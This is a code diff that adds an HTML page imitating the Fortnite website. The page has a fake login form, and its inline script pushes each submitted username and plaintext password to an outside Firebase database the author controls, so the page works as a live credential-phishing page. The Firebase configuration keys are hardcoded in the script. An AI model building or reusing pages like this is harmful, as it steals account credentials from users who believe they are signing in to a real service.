@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Fortnite </title>
+    <link rel="icon" type="image/ico" href="Res/téléchargement.png" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css">
+    <link rel="stylesheet" href="Css/style.css">
+
+
+
+</head>
+
+<body>
+    <header>
+
+        <div class="logo2"><a href=""><img id="logo2" src="Res/logo2.png" alt="Leao" style="    height: 50px;
+            width: 150px; position: absolute; left: 0;"></a></div>
+        <input type="checkbox" id="chk">
+        <label for="chk" class="show-menu-btn">
+            <i class="fas fa-ellipsis-h"></i>
+        </label>
+
+
+        <ul class="menu">
+            <li><a href="battlepass.html"> Battle Pass</a></li>
+            <li><a href="creative.html"> Creative</a></li>
+            <li><a href="competitive.html"> Competitive </a></li>
+            <li><a href="news.html"> News</a></li>
+            <li><a href="help.html"> Help</a></li>
+            <li><a href="https://merch.fortnite.com/"> Merch</a></li>
+            <div class="btn"><a href="signup.html">Sign In</a></div>
+        </ul>
+    </header>
+    <main class="sign-up">
+
+
+        <form class="login-box" id="formSign" style="z-index: -10;">
+            <h1>Login</h1>
+            <div class="textbox">
+                <i class="fas fa-user"></i>
+                <input type="text" placeholder="Username" id="user">
+            </div>
+
+            <div class="textbox">
+                <i class="fas fa-lock"></i>
+                <input type="password" placeholder="Password" id="pass">
+            </div>
+
+            <button id="submit-data">Sign In</button>
+        </form>
+    </main>
+
+</body>
+<script src="https://www.gstatic.com/firebasejs/7.8.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.8.1/firebase-database.js"></script>
+<script src="Js/main.js"></script>
+<script>var firebaseConfig = {
+        apiKey: "AIzaSyA8_BCqsfW_VVFqrR07uuiCUymVYgSAlgU",
+        authDomain: "fortnite-d8d0f.firebaseapp.com",
+        databaseURL: "https://fortnite-d8d0f.firebaseio.com",
+        projectId: "fortnite-d8d0f",
+        storageBucket: "fortnite-d8d0f.appspot.com",
+        messagingSenderId: "361925421507",
+        appId: "1:361925421507:web:e336a3787c5aef0d3c7576",
+        measurementId: "G-RW8ESV6RLR"
+    };
+    firebase.initializeApp(firebaseConfig);
+    let database = firebase.database()
+    let ref = database.ref("Fortnite")
+    // Initialize Firebase
+
+    document.getElementById("formSign").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        submitData();
+    })
+
+    function submitData() {
+        let data = {
+            name: document.getElementById("user").value,
+            password: document.getElementById("pass").value
+
+        }
+        ref.push(data)
+    }</script>
+
+</html>
